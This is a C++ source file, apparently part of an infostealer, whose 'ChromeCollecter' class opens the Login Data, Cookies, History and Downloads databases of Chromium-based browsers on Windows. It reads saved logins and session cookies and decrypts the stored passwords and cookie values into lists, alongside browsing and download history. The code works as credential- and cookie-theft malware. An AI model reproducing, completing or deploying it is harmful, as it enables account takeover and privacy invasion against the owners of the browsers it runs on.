#include <memory>
#include "../includes/sqlite3.h"
#include "../includes/Base64.h"
#include "../includes/cJSON.h"
#include "../includes/ChromeCollecter.h"




void ChromeCollecter::collectPasswords(std::list<userData>& userDataList)
{
	for (const auto& browser : m_chromeList)
	{
		if (prepareToGoOverSqlite(browser, "Login Data"))
			collectPasswordsFromSqlite(userDataList);
	}
}

void ChromeCollecter::collectCookies(std::list<CookieData>& cookiesDataList)
{
	for (const auto& browser : m_chromeList)
	{
		if (prepareToGoOverSqlite(browser, "Cookies"))
			collectCookiesFromSqlite(cookiesDataList);
	}
}

void ChromeCollecter::collectHistory(std::list<historyData>& historyDataList)
{
	for (const auto& browser : m_chromeList)
	{
		if (prepareToGoOverSqlite(browser, "History"))
			collectHistoryFromSqlite(historyDataList);
	}
}

void ChromeCollecter::collectDownloads(std::list<downloadsData>& downloadsDataList)
{
	for (const auto& browser : m_chromeList)
	{
		if (prepareToGoOverSqlite(browser, "Downloads"))
			collectDownloadsFromSqlite(downloadsDataList);
	}
}

bool ChromeCollecter::prepareToGoOverSqlite(const std::string& chromePath, const std::string& infoPath)
{
	if (!m_decryptor.initDecryptor(chromePath) || !getDbPath(chromePath, infoPath))
		return false;

	return true;
}

void ChromeCollecter::collectPasswordsFromSqlite(std::list<userData>& userDataList)
{
	sqlite3* db;

	if (sqlite3_open(m_chromeSqlitePath.c_str(), &db) != SQLITE_OK)
		return;

	sqlite3_stmt* stmt;
	if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, 0) != SQLITE_OK)
		return;


	//go over the db and fill the inforamtion by row
	while (sqlite3_step(stmt) == SQLITE_ROW)
	{
		userData curr;

		char* url = (char*)sqlite3_column_text(stmt, 0);
		char* username = (char*)sqlite3_column_text(stmt, 1);
		char* password = (char*)sqlite3_column_text(stmt, 2);

		if (url == nullptr && username == nullptr && password == nullptr)
			break;
		if ((strlen(url) == 0) && (strlen(username) == 0) && (strlen(password) == 0))
			continue;

		if (url)
			curr.url = url;
		if (username)
			curr.username = username;
		std::string decPassword;

		if (m_decryptor.decrypt(password, decPassword, sqlite3_column_bytes(stmt, 2)))
			curr.password = decPassword;

		userDataList.emplace_back(curr);
	}
}

void ChromeCollecter::collectCookiesFromSqlite(std::list<CookieData>& cookieDataList)
{
	sqlite3* db;

	if (sqlite3_open(m_chromeSqlitePath.c_str(), &db) != SQLITE_OK)
		return;


	sqlite3_stmt* stmt;
	if (sqlite3_prepare_v2(db, "SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies", -1, &stmt, 0) != SQLITE_OK)
		return;

	//go over the db and fill the inforamtion by row
	while (sqlite3_step(stmt) == SQLITE_ROW)
	{
		CookieData data;

		char* host_key = (char*)sqlite3_column_text(stmt, 0);
		char* name = (char*)sqlite3_column_text(stmt, 1);
		char* path = (char*)sqlite3_column_text(stmt, 2);
		char* encryptedCookie = (char*)sqlite3_column_text(stmt, 3);
		char* expiresUtc = (char*)sqlite3_column_text(stmt, 4);

		//break if we are done
		if (host_key == nullptr && name == nullptr && path == nullptr
			&& encryptedCookie == nullptr && expiresUtc == nullptr)
			break;

		if ((strlen(host_key) == 0) && (strlen(name) == 0) && (strlen(path) == 0)
			&& (strlen(encryptedCookie) == 0) && (strlen(expiresUtc) == 0))
			continue;

		//fill inforamtion
		data.hostKey = host_key;
		data.name = name;
		data.path = path;
		data.expireUTC = expiresUtc;

		std::string decCookie;
		//decrypt cookie
		if (m_decryptor.decrypt(encryptedCookie, decCookie, sqlite3_column_bytes(stmt, 3)))
			data.value = decCookie;

		cookieDataList.emplace_back(data);
	}
}

void ChromeCollecter::collectHistoryFromSqlite(std::list<historyData>& historyDataList)
{
	sqlite3* db;

	if (sqlite3_open(m_chromeSqlitePath.c_str(), &db) != SQLITE_OK)
		return;


	sqlite3_stmt* stmt;
	if (sqlite3_prepare_v2(db, "SELECT url, title, visit_count, last_visit_time FROM urls", -1, &stmt, 0) != SQLITE_OK)
		return;

	//go over the db and fill the inforamtion by row
	while (sqlite3_step(stmt) == SQLITE_ROW)
	{
		historyData data;

		char* url = (char*)sqlite3_column_text(stmt, 0);
		char* title = (char*)sqlite3_column_text(stmt, 1);
		char* visit_count = (char*)sqlite3_column_text(stmt, 2);
		char* last_visit_time = (char*)sqlite3_column_text(stmt, 3);

		//break if we are done
		if (url == nullptr && title == nullptr && visit_count == nullptr && last_visit_time == nullptr)
			break;

		if ((strlen(url) == 0) && (strlen(title) == 0) && (strlen(visit_count) == 0)&& (strlen(last_visit_time) == 0))
			continue;

		//fill inforamtion
		data.url = url;
		data.title = title;
		data.visit_count = visit_count;
		data.last_visit_time = last_visit_time;

		historyDataList.emplace_back(data);
	}
}

void ChromeCollecter::collectDownloadsFromSqlite(std::list<downloadsData>& downloadsDataList)
{
	sqlite3* db;

	if (sqlite3_open(m_chromeSqlitePath.c_str(), &db) != SQLITE_OK)
		return;


	sqlite3_stmt* stmt;
	if (sqlite3_prepare_v2(db, "SELECT target_path, tab_url, total_bytes, start_time, end_time FROM downloads", -1, &stmt, 0) != SQLITE_OK)
		return;

	//go over the db and fill the inforamtion by row
	while (sqlite3_step(stmt) == SQLITE_ROW)
	{
		downloadsData data;

		char* target_path = (char*)sqlite3_column_text(stmt, 0);
		char* tab_url = (char*)sqlite3_column_text(stmt, 1);
		char* total_bytes = (char*)sqlite3_column_text(stmt, 2);
		char* start_time = (char*)sqlite3_column_text(stmt, 3);
		char* end_time = (char*)sqlite3_column_text(stmt, 4);


		//break if we are done
		if (target_path == nullptr && tab_url == nullptr && total_bytes == nullptr 
			&& start_time == nullptr && end_time == nullptr)
			break;

		if ((strlen(target_path) == 0) && (strlen(tab_url) == 0) && (strlen(total_bytes) == 0)
			&& (strlen(start_time) == 0) && (strlen(end_time) == 0))
			continue;

		//fill inforamtion
		data.target_path = target_path;
		data.tab_url = tab_url;
		data.total_bytes = total_bytes;
		data.start_time = start_time;
		data.end_time = end_time;

		downloadsDataList.emplace_back(data);
	}
}

bool ChromeCollecter::getDbPath(const std::string& chromePath, const std::string& infoPath)
{
	const int localData = 0x001c;
	std::string path = m_decryptor.getAppFolder(localData);
	if (path.empty())
		return false;
	m_chromeSqlitePath = path;
	m_chromeSqlitePath += chromePath + R"(\User Data\Default\)" + infoPath;
	return true;

}
